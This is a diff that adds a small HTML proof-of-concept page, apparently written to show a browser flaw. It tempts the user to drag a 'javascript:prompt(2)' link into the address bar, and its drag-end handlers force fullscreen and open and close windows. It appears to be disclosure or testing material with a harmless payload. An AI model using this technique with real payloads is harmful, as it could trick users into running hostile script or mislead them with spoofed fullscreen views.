@@ -1,0 +1,33 @@
+<html>
+<title>af</title>
+<body>
+<br><br>
+  <Center> <h1 id="demo">poc</h1> </Center>
+
+<Center> <a id="uiLinkUrlDownload"  onclick='return false;' oncontextmenu='return false;' href='https://google.com'></a>
+  <a id="linkurl" href="javascript:prompt(2)" onclick="prompt('Masukkan teks'); return false;" onclick='return false;'>Drag this Link to Adress bar/Omnibox Bar</a> </Center>
+                           
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>
+     <Center> <h1 id="demo">poc</h1> </Center>                                                
+     <Center> <h1 id="demo">poc</h1> </Center>
+<script>   
+
+                                                                      
+  document.getElementById('uiLinkUrlDownload').ondragend = function(event){
+      document.documentElement.requestFullscreen();
+   var myWindow =  window.open("https://google.com", "_self", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
+  }         
+
+
+document.getElementById('linkurl').ondragend = function(event){    
+    document.documentElement.requestFullscreen();
+   var myWindow = window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
+  }     
+</script>     
+</body></html>
